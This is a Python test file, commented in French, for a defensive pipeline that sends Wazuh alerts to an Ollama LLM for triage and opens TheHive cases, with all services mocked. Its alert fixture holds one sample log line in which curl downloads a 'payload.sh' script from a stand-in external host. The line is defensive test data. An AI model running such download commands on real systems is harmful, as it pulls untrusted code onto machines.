"""Tests d'integration du pipeline wazuh_ai_triage.py avec Wazuh, Ollama et TheHive
mockes (unittest.mock, aucun appel reseau reel). Objectif : verifier l'enchainement
complet fetch -> triage LLM -> creation de cas -> idempotence, y compris les chemins
d'erreur (LLM en panne, reponse hors-schema, cas TheHive deja existant), qui ne sont
pas couverts par les tests unitaires purs de test_wazuh_ai_triage.py."""
import os
import sys
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

os.environ.setdefault("WAZUH_INDEXER_PASSWORD", "test-password-not-real")
os.environ.setdefault("THEHIVE_API_KEY", "test-key-not-real")

import wazuh_ai_triage as wat  # noqa: E402


def _mock_response(json_body, status_code=200):
    resp = MagicMock()
    resp.status_code = status_code
    resp.json.return_value = json_body
    resp.raise_for_status.side_effect = None
    return resp


def _wazuh_hit(alert_id, level=10, description="Test rule"):
    return {
        "_id": alert_id,
        "_source": {
            "rule": {"id": "100099", "level": level, "description": description},
            "agent": {"name": "soc-lab"},
            "timestamp": "2026-07-18T18:00:00.000Z",
            "full_log": "curl -o /tmp/payload.sh http://example.invalid/payload.sh",
        },
    }


class TestFetchRecentAlerts:
    def test_fetch_recent_alerts_preserves_es_id(self):
        hits = {"hits": {"hits": [_wazuh_hit("es-id-1"), _wazuh_hit("es-id-2")]}}
        with patch("wazuh_ai_triage.requests.get", return_value=_mock_response(hits)) as mock_get:
            alerts = wat.fetch_recent_alerts(min_level=8)
        assert [a["_es_id"] for a in alerts] == ["es-id-1", "es-id-2"]
        assert mock_get.call_args.kwargs["json"]["query"]["bool"]["filter"][1] == {
            "range": {"rule.level": {"gte": 8}}
        }


class TestTriageWithLlm:
    def test_valid_llm_response_returns_triage_result(self):
        payload = {
            "incident_type": "Recuperation d'outil externe",
            "criticite": "haute",
            "mitre_tactic": "Command and Control",
            "mitre_technique": "T1105",
            "resume": "curl recupere un script depuis un hote externe.",
            "recommandation": "Isoler l'hote et analyser le script.",
        }
        ollama_body = {"response": __import__("json").dumps(payload)}
        with patch("wazuh_ai_triage.requests.post", return_value=_mock_response(ollama_body)):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is not None
        assert result.mitre_technique == "T1105"
        assert result.criticite == "haute"

    def test_malformed_json_response_returns_none(self):
        ollama_body = {"response": "ceci n'est pas du JSON valide"}
        with patch("wazuh_ai_triage.requests.post", return_value=_mock_response(ollama_body)):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is None

    def test_schema_invalid_response_returns_none(self):
        # mitre_technique absent du schema attendu
        payload = {"incident_type": "x", "criticite": "haute", "mitre_tactic": "y", "resume": "z", "recommandation": "w"}
        ollama_body = {"response": __import__("json").dumps(payload)}
        with patch("wazuh_ai_triage.requests.post", return_value=_mock_response(ollama_body)):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is None

    def test_ollama_unreachable_returns_none_without_raising(self):
        import requests as real_requests
        with patch("wazuh_ai_triage.requests.post", side_effect=real_requests.ConnectionError("connection refused")), \
             patch("wazuh_ai_triage.time.sleep"):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is None


class TestCreateTheHiveCase:
    def _triage(self):
        return wat.TriageResult(
            incident_type="Recuperation d'outil externe",
            criticite="haute",
            mitre_tactic="Command and Control",
            mitre_technique="T1105",
            resume="resume test",
            recommandation="recommandation test",
        )

    def test_creates_case_when_none_exists(self):
        alert = _wazuh_hit("es-id-1")["_source"]
        alert["_es_id"] = "es-id-1"
        search_resp = _mock_response([])  # find_existing_case_by_source_ref -> aucun resultat
        create_resp = _mock_response({"_id": "case-new"})
        with patch("wazuh_ai_triage.requests.post", side_effect=[search_resp, create_resp]) as mock_post:
            case_id = wat.create_thehive_case(alert, self._triage(), "haute")
        assert case_id == "case-new"
        assert mock_post.call_count == 2

    def test_returns_existing_case_without_duplicate_when_source_ref_already_used(self):
        """Simule le scenario du crash entre create_thehive_case() et mark_processed() :
        TheHive a deja un cas pour ce sourceRef, donc aucun second cas ne doit etre cree."""
        alert = _wazuh_hit("es-id-1")["_source"]
        alert["_es_id"] = "es-id-1"
        search_resp = _mock_response([{"_id": "case-existing"}])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp) as mock_post:
            case_id = wat.create_thehive_case(alert, self._triage(), "haute")
        assert case_id == "case-existing"
        assert mock_post.call_count == 1  # uniquement la recherche, pas de POST de creation


class TestFullPipelineWithSqliteState:
    def test_end_to_end_alert_to_case_marks_state_as_case_created(self, monkeypatch, tmp_path):
        db_path = str(tmp_path / "state.sqlite3")
        monkeypatch.setattr(wat, "STATE_DB_PATH", db_path)
        conn = wat.init_state_db()

        alert = _wazuh_hit("es-id-full")["_source"]
        alert["_es_id"] = "es-id-full"
        assert wat.already_processed(conn, "es-id-full") is False

        payload = {
            "incident_type": "Recuperation d'outil externe",
            "criticite": "haute",
            "mitre_tactic": "Command and Control",
            "mitre_technique": "T1105",
            "resume": "r",
            "recommandation": "r",
        }
        ollama_resp = _mock_response({"response": __import__("json").dumps(payload)})
        search_resp = _mock_response([])
        create_resp = _mock_response({"_id": "case-e2e"})

        with patch("wazuh_ai_triage.requests.post", side_effect=[ollama_resp, search_resp, create_resp]):
            triage = wat.triage_with_llm(alert)
            assert triage is not None
            case_id = wat.create_thehive_case(alert, triage, "haute")
            wat.mark_processed(conn, "es-id-full", case_id, status="case_created")

        assert wat.already_processed(conn, "es-id-full") is True
        row = conn.execute("SELECT status, case_id FROM processed_alerts WHERE alert_id = ?", ("es-id-full",)).fetchone()
        assert row == ("case_created", "case-e2e")
        conn.close()

    def test_end_to_end_llm_failure_leaves_alert_retryable(self, monkeypatch, tmp_path):
        db_path = str(tmp_path / "state.sqlite3")
        monkeypatch.setattr(wat, "STATE_DB_PATH", db_path)
        conn = wat.init_state_db()

        alert = _wazuh_hit("es-id-fail")["_source"]
        alert["_es_id"] = "es-id-fail"

        import requests as real_requests
        with patch("wazuh_ai_triage.requests.post", side_effect=real_requests.ConnectionError("boom")), \
             patch("wazuh_ai_triage.time.sleep"):
            triage = wat.triage_with_llm(alert)
        assert triage is None
        wat.mark_processed(conn, "es-id-fail", None, status="failed_retryable")

        # L'alerte doit rester eligible a une nouvelle tentative, pas "traitee" definitivement.
        assert wat.already_processed(conn, "es-id-fail") is False
        conn.close()
